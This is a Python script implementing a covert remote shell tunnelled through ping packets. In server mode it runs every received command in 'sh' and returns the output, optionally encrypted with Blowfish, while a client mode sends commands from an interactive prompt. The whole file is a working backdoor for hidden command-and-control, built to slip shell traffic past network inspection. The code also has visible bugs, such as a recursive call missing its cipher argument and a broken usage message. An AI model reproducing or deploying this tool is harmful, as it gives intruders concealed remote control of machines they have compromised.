#!/usr/bin/env python

from __future__ import print_function

from subprocess import Popen, PIPE
from base64 import b64encode as enc, b64decode as dec

from readping import get_one
from sendping import send_one
import blowfish

def encrypt(mesg, cipher):
    mesg = enc(mesg)
    strs = []
    while len(mesg) >= 8:
        strs += [mesg[:8]]
        mesg = mesg[8:]

    strs += [mesg + '\0' * (8 - len(mesg))]
    return ''.join([cipher.encrypt(item) for item in strs])

def decrypt(ciphertext, cipher):
    strs = []
    while len(ciphertext) >= 8:
        strs += [ciphertext[:8]]
        ciphertext = ciphertext[8:]

    if ciphertext != '':
        return None

    padded = ''.join([cipher.decrypt(item) for item in strs])

    return dec(padded.rstrip('\0'))

def send_covert(lead, message, dest, cipher):
    if cipher:
        outbound = encrypt(lead + message, cipher)
    else:
        outbound = lead + message
    send_one(outbound)

def get_covert(lead, cipher):
    mesg = get_one()
    if not cipher and mesg.load[:len(lead)] == lead:
        return mesg.load[len(lead):]

    payload = decrypt(mesg.load, cipher)
    if payload and payload[:len(lead)] == lead:
        return payload[len(lead):]
    else:
        return get_covert(lead)

def send_loop(cipher):
    while True:
        try:
            mesg = raw_input('>>$ ')
        except EOFError:
            mesg = '\n'
        send_covert('M:', mesg, 'localhost', cipher)
        if mesg in ('\n', 'end', 'exit', 'quit'):
            break
        print(get_covert('S:', cipher))

def get_loop(cipher):
    while True:
        shell = Popen(args=['sh'], stdin=PIPE, stdout=PIPE)
        mesg = get_covert('M:', cipher)
        if mesg in ('\n', 'end', 'exit', 'quit'):
            break
        shell.stdin.write(mesg + '\n')
        shell.stdin.write('exit\n')
        val = shell.stdout.read()
        send_covert('S:', val, 'localhost', cipher)


if __name__ == '__main__':
    import sys
    cipher = None
    if '-e' in sys.argv:
        try:
            secret_key = raw_input('encryption key: ')
        except NameError:
            secret_key = input('encryption key: ')
        cipher = blowfish.Blowfish(secret_key)

    if '-c' in sys.argv:
        send_loop(cipher)
    elif '-s' in sys.argv:
        get_loop(cipher)
    else:
        print('''\
Usage: %s [-e] (-c|-s)
    -c:     client mode
    -s:     server mode
    -e:     enable encryption
'''.format(sys.argv[0]))
